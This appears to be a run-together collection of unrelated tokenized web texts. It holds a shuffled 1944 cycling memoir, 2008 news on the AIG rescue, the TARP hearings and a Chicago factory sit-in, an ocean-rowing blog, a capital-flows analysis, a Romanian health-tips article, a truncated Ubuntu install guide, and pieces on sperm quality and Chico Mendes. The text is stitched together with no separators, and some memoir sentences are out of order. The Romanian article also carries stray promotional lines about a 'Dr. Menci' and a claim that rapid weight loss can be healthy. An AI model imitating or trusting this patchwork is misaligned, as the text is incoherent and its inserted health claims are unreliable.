Also featuring in GNOME 2.24 , support for high - resolution YouTube videos and support for remote ( non-local ) text subtitling .
But now , before starting our careers , we decided that the coming summer after graduation would be the ideal time to have our adventure .
We had a limited period of time to accomplish this .
I had signed a contract to begin teaching first grade in Middleport , New York , on the Erie Canal on September 4 , 1944 .
And so - with the leanest of equipment - we made our preparations and were ready to leave on June 22 , 1944 .
World War II affected our college life as most of the male student body joined one of the services .
Women assumed some of their roles by taking jobs in armament industries .
During the summer , I worked from early morning to evening in a public school caring for infants whose mothers were working in aircraft factories or other related industries .
We were 21 years old , just graduated from college : Doris Roy from Michigan State and Thelma Popp from Buffalo State College .
We often referred to each other as " Mouse , " as we were two blind mice wearing glasses .
I had the nickname " Poppy , " characteristic of my last name .
In 1944 , a dear friend , Doris Roy , and I undertook an adventurous journey that we dreamed of during countless hikes together over our college holidays .
We had been Camp Fire Girls together , loving the out - of - doors , camping and hiking the open road .
Our dreams finally developed into a plan to ride bicycles from our home in Buffalo , New York , to Cairo , Illinois , where the Ohio River met the Mississippi .
We admired Mark Twain ’s adventures , had read his Life on the Mississippi , and sought to follow his path to the Midwest .
The US government ripped up its eight - week - old rescue deal for AIG and signed a new $ 150 bn ( £ 96 bn ) plan that it hopes will be more likely to save the insurance giant from bankruptcy .
An original $ 85 bn loan agreed in September , topped up by a further $ 38bn last month , had failed to plug the growing black hole at the heart of the company 's derivatives insurance business , the US Treasury conceded yesterday .
Instead , in the biggest handout from its $ 700 bn Wall Street bailout fund , the government will buy a $ 40 bn stake in AIG , and make a further $ 60 bn available in the form of a loan on less onerous terms than those previously agreed .
And in an initiative that other participants in the disaster - struck mortgage derivatives market will watch closely , the Federal Reserve will buy up the toxic assets that have brought AIG to the brink of bankruptcy .
The insurer , for years one of the most respected names in the life , car and home insurance business , branched into insurance of complex financial derivatives , but it failed to prepare for the big losses that its clients would face on products linked to US mortgages , which have collapsed in value because of the housing market slump .
Many major banks and hedge funds rely on AIG to hedge some of their most dangerous investments and the Treasury had feared that the company 's failure would cause a chain reaction throughout the finance industry .
On 16 September , it in effect nationalised the company , advancing the initial loans and taking an 80 per cent stake , which will not change under the new arrangements .
Neel Kashkari , the Treasury official and former Goldman Sachs executive who is administering the $ 700 bn bailout fund , known as the Troubled Asset Relief Programme ( TARP ) , said the restructuring of the AIG deal was " necessary to maintain the stability of our financial system " .
" We recognise that the financial system remains fragile and we continue to stand ready to prevent systemic failures .
We worked with the Congress to ensure the TARP included sufficient flexibility to do just this , " he said .
The Federal Reserve is putting $ 42.5 bn into two special investment vehicles that will buy mortgage - related assets and other derivatives on AIG 's books .
Market participants said they would be keen to see what price the government would set for these instruments .
That could cause holders of similar assets to adjust their values , potentially leading to a new round of losses .

CHICAGO - Workers who got three days ' notice that their factory was shutting its doors have occupied the building and say they wo n't go home without assurances they 'll get severance and vacation pay .
About 250 union workers occupied the Republic Windows and Doors plant in shifts Saturday while union leaders outside criticized a Wall Street bailout they say is leaving laborers behind .
Leah Fried , an organizer with the United Electrical Workers , said the Chicago - based vinyl window manufacturer failed to give 60 days ' notice required by law before shutting down .
During the two - day peaceful takeover , workers have been shoveling snow and cleaning the building , Fried said .
" We 're doing something we have n't done since the 1930s , so we 're trying to make it work , " she said , referring to a tactic most famously used in 1936 - 37 by General Motors factory workers in Flint , Mich . , to help unionize the U.S. auto industry .
Fried said the company can't pay its 300 employees because its creditor , Charlotte , N.C. - based Bank of America , wo n't let them .
Crain 's Chicago Business reported that Republic Windows ' monthly sales had fallen to $ 2.9 million from $ 4 million during the past month .
In a memo to the union , obtained by the business journal , Republic CEO Rich Gillman said the company had " no choice but to shut our doors . "
Bank of America received $ 25 billion from the government 's financial bailout package .
The company said in a statement Saturday that it is n't responsible for Republic 's financial obligations to its employees .
" Across cultures , religions , union and nonunion , we all say this bailout was a shame , " said Richard Berg , president of Teamsters Local 743 .
" If this bailout should go to anything , it should go to the workers of this country . "
Outside the plant , protesters wore stickers and carried signs that said , " You got bailed out , we got sold out . "

The Chicago - based Rainbow PUSH Coalition , a civil rights group , announced in a news release Saturday that Jesse Jackson planned to visit the workers Sunday morning to offer his support .
Larry Spivack , regional director for American Federation of State , County and Municipal Employees , Council 31 , said the peaceful action will add to Chicago 's rich history in the labor movement , which includes the 1886 Haymarket affair , when Chicago laborers and anarchists gathering in a square on the city 's west side drew national attention after an unidentified person threw a bomb at police .
" The history of workers is built on issues like this here today , " Spivack said .
Representatives of Republic Windows did not immediately respond Saturday to calls and e-mails seeking comment .
Police spokeswoman Laura Kubiak said authorities were aware of the situation and officers were patrolling the area .
Workers were angered when company officials did n't show up for a meeting Friday that had been arranged by U.S. Rep.
Luis Gutierrez , a Chicago Democrat , Fried said .
Union officials said another meeting with the company is scheduled for Monday afternoon .
" We 're going to stay here until we win justice , " said Blanca Funes , 55 , of Chicago , after occupying the building for several hours .
Speaking in Spanish , Funes said she fears losing her home without the wages she feels she 's owed .
A 13 - year employee of Republic , she estimated her family can make do for three months without her paycheck .
Most of the factory 's workers are Hispanic .
NEW YORK ( CNNMoney.com ) --
Lawmakers pressed bank executives on Thursday to explain how they were using the billions of dollars they 've received from the federal government as part of the $ 700 billion bailout .
Banks are failing to use public funds to make credit more available and to help troubled homeowners , said Sen. Christopher Dodd , D - Conn. , chairman of the Senate Banking Committee .
Congress did not pass the bailout plan so banks could hoard the money or use it to scoop up faltering rivals , he said .
" We want to see more progress from our friends in the financial sector -- more progress in foreclosure mitigation , in affordable lending , and in curbing excessive compensation , " Dodd said .
" And if that progress is not forthcoming , we are prepared to legislate . "
Members of Dodd 's committee covered much of the same ground as they have in recent weeks , demanding that banks use the capital they are receiving from the rescue plan to help stimulate the economy through lending and assist homeowners facing foreclosure .
They also renewed calls to amend the bankruptcy law to allow judges to modify loan terms on primary homes .
And they voiced support for Federal Deposit Insurance Corp.
Chairman Sheila Bair 's plan to help homeowners by having the government backstop a portion of the modified loan .
Bank executives once again pointed to their efforts to increase lending and to work with delinquent homeowners .
JPMorgan Chase , for instance , is lending billions to consumers , businesses , non-profits and municipalities , said Barry Zubrow , executive vice president at JPMorgan Chase ( JPM , Fortune 500 ) .
In addition , since early 2007 , Chase has helped about 250,000 families avoid foreclosure , and a new program announced last month will aid another 400,000 people .
The bank plans to open 24 regional counseling centers to provide borrowers with face - to - face help in areas with high delinquency .
" The [ Capital Purchase Program ] enhances our ability to lend to consumers and businesses , large and small , " he said .
" In short , we have been and continue to be open to new business . "
That said , JPMorgan Chase will maintain prudent underwriting standards , since irresponsible lending is a main reason America is in its current situation , Zubrow said .
Bank of America ( BAC , Fortune 500 ) , meanwhile , originated more than $ 50 billion in mortgage loans and more than $ 6 billion home equity loans in the third quarter , said Anne Finucane , the institution 's global marketing and corporate affairs executive .
Overall , the funding of new loan commitments has increased by 6 % this year over previous year , Finucane said .
The bank is also actively buying mortgage - backed securities , adding liquidity to this market that 's crucial to funding new loans .
At Wells Fargo ( WFC , Fortune 500 ) , commercial loans made to mid-sized company are up 24 % since a year ago , while consumer loans are up almost 9 % in the third quarter compared to a year ago , said Jon Campbell , Wells ' regional banking president .
Addressing the 9,000 daily foreclosure filings
Senators also heard from consumer advocates who said that banks ' foreclosure mitigation efforts have n't done enough .
Dodd noted that 9,000 homes a day are still going into foreclosure .
" Voluntary efforts have n't worked , " said Nancy Zirkin , public policy director , Leadership Conference on Civil Rights .
Bank executives defended their modification programs and said they are working with investors of securitized mortgages to get their approval to change loan terms .
But they roundly opposed allowing bankruptcy judges to modify loans on primary homes , a measure many Democrats support .
Such a change would further drive away investors , who are already skittish about putting money into the mortgage - backed securities market .
" While we need to find a way to stimulate the housing market , do we want to put at risk that market by taking that step , " Campbell said .
Addressing lawmakers ' anger over lofty executive compensation levels , witnesses also said bonuses and payment packages will be skimpier this year as the economy and corporate performance weaken .
" Compensation also will be down very significantly this year across the firm , particularly at senior levels , " said Gregory Palm , general counsel at Goldman Sachs ( GS , Fortune 500 ) .
" We get it . "
Lawmakers on both sides of the aisle have been critical of the Treasury Department 's implementation of the bailout of the financial sector .
Democrats are concerned that banks are not increasing their lending , despite getting capital infusions from the government .
They also want to move faster to help the homeowner .
On Thursday , lawmakers pressed bank executives on whether they intend to use the bailout funds to pay dividends to shareholders or to acquire healthy banks .
They answered no to both .
Republicans , meanwhile , want more disclosure on how the Treasury Department is carrying out the plan .
" Real transparency and accountability are critical to the success of the economic rescue plan , and taxpayers have every right to know how the federal government is allocating tax dollars as part of the program , " House Republican Leader John Boehner , R - Ohio. , said in a statement Wednesday .
Treasury Secretary Henry Paulson said Wednesday that the government would broaden the reach of the plan to support non-bank financial institutions that provide consumer credit , such as credit cards and auto loans .
In this second stage of the bailout , officials also hope to attract private capital , possibly through matching investments , to give the government 's injections more heft .
Paulson also said the government is no longer planning to buy troubled mortgage assets , the original goal of the plan .
Therefore , it must come up with new ways to help homeowners and slow the tide of foreclosures , which it had hoped to do once it owned the troubled loans .
Early on the morning of September 1 , Roz Savage became the first woman to row , alone , from California to Hawaii .
The voyage of 2,600 miles took her 99 days , 8 hours and 55 minutes .
During the trip she was in surprisingly regular contact with the outside world , equipped with high - tech gear including a satellite phone , iPod loaded with audiobooks , water - proof speakers , video / still camera , and a solar panel rig to power everything ( read more about the boat and the gear ) .
In total , Savage packed a reported $ 80,000 of electronic equipment on the journey , which made it possible ( at a cost of $ 1.50 / min via the satellite phone ) to update her blog , including photos and even videos , from the middle of the Pacific .
But the media coverage from her boat did n't end with text , photos , or even video .
Savage managed to record forty podcasts ( iTunes link ) from the water as well .
They 're well worth a listen ( despite the occasional satellite phone connection problems ) , and are sponsored by Audible ( who also provided her with the audiobooks she listened to on the journey ) .
It 's an amazing thing being able to keep in touch , at least via this technological remove , with a person who 's on a solo journey across the ocean .
Here are some highlights from Savage 's blog :
Day 34 : No Emergency Exit Further to the watermaker issue , somebody suggested that maybe I should abandon my voyage .
With apologies and all due respect to that person , this really made me smile .
As I said in the podcast yesterday morning , this is not like a big city marathon , where I could just decide , " Hey , this is n't going so well , maybe ocean rowing is n't the sport for me after all " - then pull over to the side , stop running , and catch a bus to the finish .
Abandonment of my voyage simply is not an option .

Day 89 : A Watery Walkabout
I 've come to regard my little rowboat as my own personal floating nun 's cell - a place for quiet contemplation .
( In fact my existence generally has been quite nun- like : Poverty and chastity are pretty easy out here - but I 'm afraid obedience is not my strong suit , no matter where I am ! ) ...
Day 94 : Fundamental Issues I 've been at sea for over 3 months now , and it 's starting to take its toll on my body .
I 've been fortunate so far - but this week I 've started to fall apart .
Nothing major - fingernails lifting from fingers ( apparently due to some fungal thing ) , aches in the back , sunburned skin - but worst of all is the saltwater rash .
It may sound like a trivial complaint , but grown men have been reduced to tears and / or excessive use of painkillers by this undignified ailment .
...
Savage plans to continue to row around the world in two more legs , over the next two years .
But for the moment , she 's relaxing and healing up in Hawaii .
Check out her website for tons of information on this truly amazing voyage !

At least a crisis marked by a run out of risky US assets and into safe US assets .
Right now Agency bonds -- think Freddie and Fannie -- are considered risky assets while Treasuries are not .
A run out of all US assets and the dollar would look very different .
The October TIC data tells a striking story -- one marked by a massive surge in demand by both private and official investors for " safe " assets .
Foreign investors bought $ 182 billion of Treasuries -- including $ 147.4 billion of short - term Treasury bills .
There is no real mystery why bill yields dropped so low even as the supply of bills surged .
And foreigners added $ 207 billion to dollar bank accounts .
Sum that up and it works out to close to $ 400 billion in demand for safe dollar denominated assets .
If that kind of monthly inflow is annualized it is a shockingly large number .
It is n’t hard to figure out why the dollar rallied .
$ 400 billion in a month is far more than the US needs to cover its trade deficit .
It allowed foreigners to reduce their holdings of Agencies by close to $ 75 billion ( including a $ 25 billion fall in short - term Agencies ) , their holdings of long - term corporate bonds by $ 13 billion and their holdings of US equities by $ 6 billion without causing any strain on the dollar .
Indeed , the fall in foreign holdings of US corporate bonds and US equities ( though not the outflow from the Agencies ) could have been financed by the sale of $ 36 billion of foreign assets by US residents ...
Usually I argue that the TIC data understates official flows .
And this month ’s data may well do so .
Some of the $ 35 billion in long - term Treasury bonds bought by UK investors were probably bought by central banks , and selling by central banks could have contributed to the $ 13.8 b in net sales of long - term Agencies .
But in broad terms I do n’t doubt that private demand for " safe " US assets soared as a result of the crisis -- and much of the inflow came from private investors seeking to increase their holdings of the most liquid dollar assets .
In October , China was about the only central bank adding to its reserves ( I suspect , it has n’t formally released its reserves data ) .
Most central banks were selling .
That shows up in the US TIC data .
South Korea , Brazil , Mexico , Russia and Ukraine were all net sellers of long - term US Treasury bonds ...
The big central bank flow was a reallocation away from Agencies toward Treasuries .
And specifically toward short - term Treasury bills .
China increased its holdings of short - term Treasury bills by a stunning $ 56 billion while also buying $ 10 billion of long - term Treasuries .
That flow alone would have been enough to cover the trade deficit in the absence of any offsetting outflows .
Russia cut its holdings of short - term Agencies by a little over $ 22 billion while increasing its holdings of short - term Treasuries by almost $ 12 billion .
So much for talk that central banks are always a stabilizing presence the market .
They clearly have destabilized the Agency market .
The fall in demand for Agencies over the past three months -- and most Agency demand has come from central banks until recently -- has been sharper than than the fall in demand for US corporate bonds ( think securitized subprime mortgages , the category " corporate bonds " in the BoP data includes asset - backed securities ) after the crisis of last August .
The fall in demand for corporate bonds ( the redline ) is what generated a rather scary graph after the initial crisis last August .
Things have n’t gotten any better since ...
The Agency market is a rather important market .
Increased lending by the Agencies offset the fall in demand for " private " mortgage - backed securities after the crisis last August .
More recently , the absence of a " central bank bid " has kept Agency spreads wide even after the US Treasury bailout of Freddie and Fannie .
And that in turn has pushed the US to adopt other measures to bring down long - term mortgage rates .
The Fed and the Treasury are literally now buying the Agencies that foreign central banks are selling .
Action , reaction ...
Micile modificări fac o mare diferență .
Cu to ții vrem să știm să fim sănătoși , dar pare un obiectiv atât de ridicat .
Dacă îți propui să faci schimbări în stilul de viață sănătos , poți simți simultan inspirație și intimidare .
Adică , de unde începi chiar ?
Trebuie să vă revizuiți întreaga viață dintr -o lovitură ?
Răspunsul , este posibil să fii fericit să știi , este : nu .
Când vine vorba de adoptarea de noi obiceiuri sănătoase și de a le face să se lipească , există multe lucruri mici pe care le puteți face , care vor face o diferență mare pe termen lung ( și nu vă vor înnebuni în proces ) .
În loc să încercați să vă îmbunătățiți sănătatea cu o transformare uriașă , încercați aceste nouă trucuri mici , practic nedureroase , pentru rezultate de lungă durată .
1. Plătiți mesele înapoi .
Oamenii se îngrămădesc adesea pe carbohidrați , apoi se înmoaie pe proteine , apoi completează totul cu o lingură mică de legume în orice spațiu a rămas .
În schimb , mergeți în ordine inversă , Abby Langer , RD , proprietarul Abby Langer Nutrition din Toronto , îi spune SELF : Umpleți jumătate din farfurie cu legume , apoi împărțiți sferturile rămase între proteine ​​și un amidon , în mod ideal ceva format din carbohidrați complecși în loc de cele rafinate , precum orezul brun .
Dr. Menci recomandă ca proteinele să nu fie combinate cu carbohidrații .
Servirea în acest fel vă ajută să vă asigurați că veți primi porțiile zilnice recomandate de legume ( cel puțin 2 cani ½ , spune USDA ) , plus că vă crește aportul de fibre și nivelul de hidratare , datorită conținutului de apă din legume .
2. Puneți mâncarea deoparte când ați terminat de servit .
„ Oricine va mânca mai mult dacă mâncarea se uită la ei ” , spune Langer .
Întotdeauna simțiți-vă liberi să vă apucați mai mult dacă aveți cu adevărat foame , dar în acest fel , veți ști că este din cauza unei nevoi fizice de mai multă mâncare , în loc de pură comoditate sau ispită .
3 . Bea un pahar cu apă înainte de fiecare masă .
Consumul de apă de care ave ți nevoie în fiecare zi este necesar pentru ca toate sistemele corpului dvs .
să funcționeze fără probleme , dar vă va împiedica , de asemenea , să mâncați excesiv din cauza foamei , facilitând o abordare mai atentă a meselor , spune Langer .
4 . Pentru a dubla atenția , mestecați fiecare mușcătură bine înainte de a înghiți .
Lista „ motivelor pentru care trebuie să - ți încetine ști rostul atunci când mănânci ” este aproximativ atât de lungă , cât explic ă Langer .
Inghitirea mancarii poate duce la balonare din cauza aerului în plus pe care îl înghiți , sentimentul prea plin , deoarece nu îi dai corpului tău șansa de a procesa sațietatea înainte de a - ți cură ța farfuria și pierde complet cât de delicioasă este mâncarea este de fapt .
Puteți alege un număr de mestecari pe care să le respectați pe fiecare mușcătură , cum ar fi 20 , sau puteți alege o abordare mai puțin regidă , cum ar fi să vă asigurați că înghițiți în mod natural , nu înghițiți greu pentru a coborâți guri abia mestecate .
5. Numiți alimentele „ sănătoase ” și „ mai puțin sănătoase ” în loc de „ bune ” și „ rele ” .
„ Când oamenii etichetează mâncarea ca fiind „ bună ” și „ rea ” , aceasta se transmite într - o judecată a lor - dacă mănânci mâncare „ bună ” , ești o persoană bună , dacă mănânci mâncare „ proastă ” , ai fost s- a comportat prost ” , spune Langer .
Acest lucru nu ar putea fi mai departe de adevăr , așa că încetați să vă înscrieți într - un timp emoțional doar din cauza a ceea ce mâncați .
Există diferite procedee de obținere a uleiului de măsline ce influențează valoarea lui nutritivă .
„ Într - adevăr , niciun fel de mâncare nu este într - adevăr rău și niciun fel de mâncare nu este foarte bun - unii sunt mai sănătoși decât alții ” , spune Langer .
Reîncadrarea gândirii astfel vă va ajuta probabil să învățați arta de a vă răsfăța cu moderație în loc să vă bucurați de alimente „ rele ” , plus că este doar un mod mai bun de a vă trata .
Dr. Menci nu recomandă niciun fel de carne procesată .
6 . Pentru fiecare oră pe care o petreceți stând , ridicați-vă și mergeți rapid timp de cinci minute .
Să stai toată ziua nu e bine pentru fundul tău sau pentru inima ta .
Activitatea fizică este extrem de importantă pentru longevitatea ta și totul se adaugă , a declarat pentru SELF experta în sănătate a femeilor , Jennifer Wider , MD .
Uneori se poate simți imposibil să te încadrezi într -o tonă de exerciții fizice atunci când nu ești obișnuit , dar mișcarea piperată pe parcursul zilei este mult mai realizabilă .
De exemplu , dacă respectați această regulă în timp ce stați timp de opt ore pe zi , veți termina mersul timp de 40 de minute , punând o dantură lăudabilă în recomandarea minimă de 150 de minute de activitate aerobă cu intensitate moderată pe săptămână .
Dr. Menci explică cum ar trebui să combinăm lactatele cu celelalte alimente .
7 . Și dacă unele tipuri de exerciții vi se par îngrozitoare , faceți altceva .
Da , dansul la Beyoncé acasă este un exercițiu .
Va arde cât mai multe calorii ca o clasă intensă de lagăr de încărcare ?
Nu .
Dar este vorba de a alege exerciții de care te vei bucura suficient de mult pentru a continua să faci , nu tipul care îți face sufletul să - și dorească să moară , dar are o plată calorică maximă imediată , Michelle Segar , Ph.D. , director Sport , Health , și Centrul de Cercetare și Politici de Activități de la Universitatea din Michigan și autor al cărții No Sweat !
CUM ȘTIINȚA simplă a motivației vă poate aduce o viață de viață a sănătății , spune SELF .
Iată recomandarea lui Segar : „ Vino la asta dintr - un unghi de curiozitate și spune - ți :„ Ce tipuri de lucruri pozitive aș simți motivat să fac ? ” ” Acest tip de abordare te ajută să fii sincer cu tine însuți de unde vine motivația ta ( poți , de asemenea , ia întrebarea lui Segar despre motivația antrenamentului ) .
A ajunge la partea de jos a acestui lucru este esențial atunci când încercăm să cimentăm orice fel de obicei , în special cele fizice , cum ar fi exercițiile fizice și mâncatul bine .
Este mult mai greu să rămâi cu activitățile infernale decât cu cele plăcute .
Dr. Menci are o carte care ne învață cum să ne hidratăm .
Acest lucru face , de asemenea , mai ușor să vedeți „ eșecurile ” în călătoria dvs .
către sănătate , așa cum sunt experiențele de învățare pe care le au cu adevărat .
ți-e leneș , doar că s-ar putea să nu ofere tipul corect de motivație de care ai nevoie .
„ Abordați totul ca o oportunitate de învățare pentru a vedea ce se simte bine și ce funcționeaz ă și ce nu ” , spune Segar .
8. Lasă - te să dormi mai mult cu trepte de cinci minute .
Abandonarea completă a listei de sarcini , indiferent dacă este vorba de afaceri sau personale , pentru a merge la culcare cu trei ore mai devreme nu este fezabilă .
Însă , dacă o faci puțin cu încetare , te vei aclama cu noua ta realitate bine odihnita într - un mod ușor de gestionat , Christine Carter , doctorand , coleg principal la UC Berkeley , Greater Good Science Center și autoare a The Sweet Spot :
Cum să vă găsiți groove - ul acasă și la locul de muncă , spune SELF .
Încercați să vă culcați cu cinci minute mai devreme în fiecare noapte ( sau la fiecare câteva nopți , dacă acest lucru este cu adevărat dificil pentru dvs. ) până când atingeți cele șapte până la nouă ore recomandate de Fundația Național ă a Somnului pentru adulți .
9 . De fiecare dată când îți faci un nou obiectiv , împarte -l în bucăți de mușcături .
„ Sunt un mare fan al unor mici modificări ușoare ” , spune Carter .
La fel și Segar : „ Micul este deștept .
Micul este strategic .
Nu poți lua oameni care nu știu să cânte la pian și să - i pui să cânte la Mozart .
Când ceva este complex , este nevoie de timp pentru a învăța .
” Pentru că asta este cu adevărat un obicei : să înveți cum să îți trăiești viața într - un mod diferit .
Doctorul Menci ne spune care sunt cele mai sănătoase fructe .
Acest lucru se poate aplica la orice și la orice aspect sănătos .
Să presupunem că ați luat un sandviș uriaș la prânz în fiecare zi , dar doriți să reduceți carbohidrații rafinați .
Nu înjurați că nu veți lăsa niciodată o altă bucată de pâine albă să - ți treacă buzele - încercați mai întâi într -o salată , apoi lăsați-vă să ave ți sandvișul până când sunteți mulțumiți .
Sau optați pentru pâine integrală în câteva zile din săptămână până vă obișnuiți , apoi eliminați treptat sortimentul rafinat .
Procesul rapid de slăbire poate fi și sănătos .
Carter explică faptul că , atunci când nu spui că nu mai poți avea niciodată sandvișul tău preferat , doar că vei începe prin a face o mică modificare pentru a - i spori conținutul de sănătate - sau oricare pas mic pe care l-ai ales spre un obiectiv pe care l-ai putea avea - este mai ușor pentru creierul tău să urce la bord , să învețe să - i placă și să te pregătească pentru succes .
Installing ubuntu-system - panel ( USP ) On Ubuntu 8.10
Version 1.0
Author : Falko Timme
ubuntu - system - panel is a simple launcher for the GNOME desktop , providing easy access to Places , Applications and common configuration items for your computer .
This guide shows how to install and configure it on an Ubuntu 8.10 desktop .
I do not issue any guarantee that this will work for you !
1 Installing ubuntu-system - panel
Open a terminal ( Applications > Accessories > Terminal ) :
Install Subversion ...
sudo apt - get install subversion

Intelligent men have better quality sperm , research finds
Researchers found men of higher intelligence have better quality sperm
They can often be overlooked in favour of their handsome counterparts .
But brainboxes should stop despairing because research shows they are more virile than other men .
Scientists have shown that bright men have better sperm .
They produce more of it and it is of higher quality , suggesting they are better - equipped to start a family than their intellectually inferior friends and colleagues .
Researchers from the Institute of Psychiatry at King 's College London made the link after comparing archived data on 425 Vietnam War veterans .
This dated back to 1985 , when the men had given sperm samples as part of an extensive medical and undergone intelligence testing .
Comparing the two clearly showed that the brainiest men had the best quality sperm .
Total sperm count was higher , as well as sperm concentration and ability to swim , the journal Intelligence reports .
What is more , the finding could not be explained by factors known to affect health such as smoking , drinking and obesity , said researcher Rosalind Arden .
She said : ' We took two characteristics that seemed , on the surface , unlikely to be associated with each other - intelligence and sperm quality - and tested whether there was a statistical relationship between them .
' We found a small positive relationship : brighter men had better sperm .
' This association was n't caused by habits like avoiding smoking or drinking - the big hitters of health . '
The finding feeds into recent research showing intelligence is linked to many aspects of health , including lifespan .
While it could be argued that brainy folks lead healthier lives , Miss Arden believes IQ is an outward sign of good genes .
If the genes involved in intelligence also have many other functions in the body , brainy people could expect to be fitter and more fertile .
Similarly , flaws that impair intelligence could harm health and the ability to become a parent .
Miss Arden said : ' We were interested in testing the idea that if most of our genes act on many characteristics ( not one gene , one trait ) , there might be a weak but discoverable relationship right across all of our characteristics - from nose to toes .
' This set of weak relationships would give rise to a " fitness factor " in evolutionary terms .
' This does not mean that men who prefer Play - Doh to Plato always have poor sperm : the relationship we found was marginal .
' But our results do support the theoretically important " fitness factor " idea . '
Fertility experts , however , said that straining to complete crossword puzzles and other brain - sharpening games was likely to do little to improve a man 's chances of fatherhood .
Dr Allan Pacey , a male fertility expert from Sheffield University , said : ' The fact that it 's possible to detect a statistical relationship between intelligence and semen quality in adult men probably says more about the co-development of brain and testicles when the man was in his mother ' womb , and therefore how well they both function in adult life , rather than suggesting that playing Sudoku can somehow stimulate more sperm to be produced .
' The improvement in semen quality with intelligence observed in this paper is small and therefore it is unlikely to have a big impact on the ability of men of different intelligences to conceive . '
I ’m sure many people like me have had the romantic dream of living aboard a boat : being rocked to sleep by gentle waves and waking up to new neighbors in the marina , chatting with friends over drinks in your cockpit while cooking a freshly caught fish on a tiny stove .
Having your home on the water can be both extremely rewarding and more work than you ever thought .
People who live on boats are probably the top experts on how to live in a small space and how to conserve limited water and power .
Living on a boat does take some adjustments to the way that you would live in a house .
Space is a major factor when living on a boat and every inch needs to be used effectively .
While most boats are built with an eye on efficient storage , you will have to downsize your possessions quite a bit to get things to pack neatly into the boat .
Life Lessons : Moving onto a Boat
Living on a boat is also different from living in a small house .
Water and weather is a constant threat to the integrity of your home and your comfort .
While many newer boats have everything you need for comfort , some older , less expensive boats may need constant upkeep and maintenance .
The ability to know your boat inside and out , and be able to make repairs yourself can save you big headaches and bills .
Once you do have a boat , if you are not cruising , you will need to find a marina or dock you can rent or buy .
Prices for docks vary for different areas .
They are usually priced by the foot or the yard .
However , not all marinas are liveaboard friendly .
Many marinas consider someone who lives on their boat as a transient .
On the other hand , you can find a few marinas that offer showers , storage , laundry facilities , electricity and cable TV to liveaboards .
If you are able to create your own power ( many boats come with solar panels ) , haul your own water and wastewater and be as self - sufficient as possible , you may be able to live very cheaply on anchor or on a mooring ball .
Dock Search is a database of docks and marinas around the world for rent and for sale .
Some offer liveaboard options .
Marinas.com shows aerial and map views of marinas around the world .
Mark Nicholas , who lives on a sailboat , has written the book , The Essentials of Living Aboard A Boat , and also has some interviews with liveaboards that are available as video podcasts .
His blog also has loads of information and links about how to be a successful liveaboard .
I found some additional excellent blogs , videos and websites about living aboard a boat and each covers the issues of space , boat problems and maintenance , cruising , cooking and docking .

Twenty years after the killing of Chico Mendes , one of the world 's most prominent rainforest defenders , hundreds of human rights and environmental activists still face the threat of assassination in Brazil , a new study claims .
The report , compiled by Brazil 's Catholic Land Commission ( CPT ) and due to be released in full early next year , reveals that at least 260 people , among them a Catholic bishop , live under the threat of murder because of their fight against a coalition of loggers , farmers and cattle ranchers .
The list names Frei Henri des Rosiers , a French priest based in the Amazon town of Xinguara , as a particular target .
Police are investigating claims he has a £ 14,000 price on his head because of his fight against slave labour .
Also named are Maria José Dias da Costa , a union leader in the remote town of Rondon do Pará , and an Austrian bishop , Dom Erwin Krautler , who has been under 24 - hour police guard for two years because of his battle against developers and child prostitution in his Amazonian diocese .
In February this year , Francisco da Silva , a 51 - year - old leader of the landless movement in the Amazon , was killed with a single shot to the head .
He had been named in a previous CPT report about rural leaders receiving death threats .
On Monday night the Brazilian president , Luiz Inácio Lula da Silva , is expected to address the country on television to pay homage to the life of Mendes , a rubber tapper turned environmentalist who was gunned down outside his home on 22 December 1988 .
Lula 's address is part of a wave of tributes across Brazil , from marches on the streets of Rio de Janeiro to celebrations in his hometown of Xapuri .
But while his standing as a symbol of protest is not in doubt 20 years on , environmentalists and human rights activists are divided on Mendes 's practical legacy .
In September this year government figures showed that deforestation in the Amazon had risen by 64 % over the previous 12 months .
Earlier this month , members of Ibama , Brazil 's environmental taskforce , discovered that nearly 3,000 hectares ( 7,410 acres ) had been deforested , mostly illegally , inside a reserve named after Mendes .
" Each year on 22 December I ask myself if he died in vain or not .
And today , after all these years , the answer is not yet clear to me , " said Alfredo Sirkis , a prominent member of Brazil 's Green party and friend of Mendes .
Sirkis said : " I wo n't say that nothing has improved , " but he added that the last 20 years had seen a " continuation of this project of devastation " .
Born in the remote Amazon state of Acre on 15 December 1944 , Francisco Alves Mendes Filho followed in his parents ' footsteps early in life , becoming a rubber tapper at the age of nine .
By the mid-1980s he was spearheading protests against local cattle ranchers and their gunmen , who sought to tear down the forest and drive out the impoverished rubber tappers .
Renowned for visionary views on sustainable development , Mendes quickly became a poster - boy for the international green movement , travelling to the US to lobby against infrastructure projects he believed would devastate the Amazon .
" He knew how to talk to the rubber tapper in the middle of the forest in the same way he knew how to talk to a technocrat from the World Bank , " said Sirkis .
His murder turned him into an eco-martyr both at home and abroad , and catapulted the issue of rainforest destruction further up the international agenda .
" Chico left a great legacy , " said Brazil 's former environment minister , the senator and former rubber tapper Marina Silva .
" Twenty years on , the environmental question has gained strength across the whole world . "
She added : " He was a guy that spoke of things which were ahead of his time ... [ and he ] made me want to be part of that fight . "
Bishop Krautler agrees : " It was never in vain .
In death he [ Mendes ] spoke even louder than when he was alive . "
Soon after his death , Brazil 's government began introducing the " extractivist reserves " of which Mendes had dreamed .
The reserves were areas of rainforest where local populations could earn their living while simultaneously protecting the environment .
The first , created in 1990 , was named after him and now covers 11 m hectares of land .
Chico Mendes : Martyr for our times
When I heard , 20 years ago this week , that Chico Mendes , leader of the Brazilian rubber tappers ' union , had been murdered , I was sad but not surprised .
The last time I saw Chico , five months earlier in the town of Xapuri in the western state of Acre , he told me the ranchers had already tried to kill him six times .
Looking at my notebooks , I now notice that Chico actually named the man later convicted of organising his killing : Darly Alves da Silva , a rancher who has not been seen since escaping from jail where he was serving a sentence for the crime .
Darly already had a murder charge against him in another state , something Chico reported to the police .
It was when Chico 's union successfully defended a piece of virgin rainforest sprinkled with rubber trees against the ranchers ' attempts to claim it that the struggle became personal .
Before the shooting of Mendes only 10 people had ever been brought to court for around 1,000 murders in the Amazon in the 1980s .
But Chico was different and his murder sparked an international furore .
In his speeches he used to say : " Come here and kill me .
My chest is open . "
He knew he might achieve more by his death than he had by his life .
Today the extractive reserves Chico championed are relatively successful in protecting parts of the Amazon , as are reserves run by the rainforest 's indigenous people .
Now people talk of using carbon credits to protect similar areas around the world .
And I realise that I had met the martyr for our times - the Gandhi , or perhaps the Che Guevara , of our environmental age .

UPDATED EXCLUSIVE :
Congressional transportation leaders plan to announce today that the federal government is seeking contractors to build a new $ 30 billion to $ 40 billion high - speed rail line between Washington and New York that would be used exclusively by passenger trains .
